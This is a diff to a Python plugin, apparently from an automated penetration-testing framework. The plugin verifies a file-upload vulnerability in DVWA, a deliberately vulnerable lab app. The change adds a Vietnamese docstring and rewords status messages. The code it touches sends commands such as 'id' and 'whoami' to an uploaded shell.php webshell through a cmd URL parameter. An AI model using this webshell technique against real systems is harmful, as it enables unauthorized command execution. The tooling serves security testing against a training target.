@@ -27,6 +27,7 @@ class DVWAUploadPlugin(BasePlugin):
         return service_info.get("service", "") in ["http", "https"]
 
     def _execute_shell(self, target_ip, target_port, filename, cmd, cookie):
+        """Gọi webshell đã upload để thực thi lệnh, bóc tách mã lỗi hệ thống sạch"""
         try:
             encoded_cmd = urllib.parse.quote(cmd)
             full_url = f"http://{target_ip}:{target_port}/hackable/uploads/{filename}?cmd={encoded_cmd}"
@@ -60,7 +61,7 @@ class DVWAUploadPlugin(BasePlugin):
     def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
         cookie = context.get("session_cookie", "")
         if not cookie:
-            return {"status": "PENDING", "evidence": "Chưa có session cookie"}
+            return {"status": "PENDING", "evidence": "Thiếu thông tin session cookie xác thực."}
 
         uploaded_shell = "shell.php"
         kb_commands = ["id", "whoami"]
@@ -74,7 +75,7 @@ class DVWAUploadPlugin(BasePlugin):
                 break
 
         if not initial_confirmed:
-            return {"status": "FALSE_POSITIVE", "evidence": "Không kết nối được Web shell hoặc shell bị chặn."}
+            return {"status": "FALSE_POSITIVE", "evidence": "Không kết nối được Web shell hoặc tệp tin kích hoạt bị chặn."}
 
         telemetry_summary = self.logger.get_plugin_telemetry(self.METADATA["id"])
         decision = self.engine.calculate_score(
